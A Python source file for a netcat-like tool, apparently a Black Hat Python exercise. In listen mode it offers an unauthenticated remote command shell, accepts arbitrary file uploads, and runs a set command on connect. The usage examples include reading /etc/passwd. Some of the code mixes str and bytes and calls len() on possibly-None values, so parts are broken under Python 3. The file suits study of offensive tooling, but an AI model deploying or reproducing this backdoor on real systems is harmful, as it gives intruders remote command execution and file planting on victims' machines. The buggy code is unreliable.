import sys
import socket
import getopt
import threading
import subprocess
from docopt import docopt

listen = False
command = False
upload = False
execute = ""
target = ""
opts = ""
upload_destination = ""
port = 0


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(("Sucessfully saved file to %s\r\n" % upload_destination).encode("utf-8"))
        except:
            client_socket.send(("Failed to save file to %s\r\n" % upload_destination).encode("utf-8"))
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send("<NC:#> ".encode("utf-8"))
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode("utf-8")
            response = run_command(cmd_buffer)
            client_socket.send(response)


def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        print(addr, ' is connected')
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    global opts
    usage_text = """
    BHP NetCat Tool

    Usage:
    	netcat.py -t <target_host> -p <port>
    	netcat.py -t <target_host> -p <port> -l
    	netcat.py -t <target_host> -p <port> -l [-c | -u <upload_path> | -e <exec_command>]

    Options:
      -t --target=target_host
      -p --port=network_port 
      -l --listen               - listen on [host]:[port] for incoming connections
      -e --execute=file_to_run  - execute the given file upon receiving a connection
      -c --commandshell         - initialize a command shell
      -u --upload=destination   - upon receiving connection upload a file and write to [destination]
                              ^^ at least two spaces in here to not fuck up parser
                                 usage: https://github.com/docopt/docopt#option-descriptions-format

    Examples:
      netcat.py -t 192.168.0.1 -p 5555 -l -c
      netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
      netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"
      echo 'ABCDEFGHI' | ./netcat.py -t 192.168.11.12 -p 135
    """

    arguments = docopt(usage_text)

    # print(arguments)
    # sys.exit()
    # {'--commandshell': False,
    #  '--execute': None,
    #  '--listen': True,
    #  '--port': '222',
    #  '--target': '111',
    #  '--upload': '333'}

    listen = arguments['--listen']
    execute = arguments['--execute']
    command = arguments['--commandshell']
    upload_destination = arguments['--upload']
    target = arguments['--target']
    port = int(arguments['--port'])


    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('utf-8')
                if recv_len < 4096:
                    break
            print(response)

            buffer = input("")
            buffer += "\n"

            client.send(buffer.encode('utf-8'))
    except Exception as e:
        print("[*] Exception! Exiting. \r\n", e)
    client.close()


def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "<NC:#> Failed to execute command.\r\n".encode("utf-8")

    return output


main()
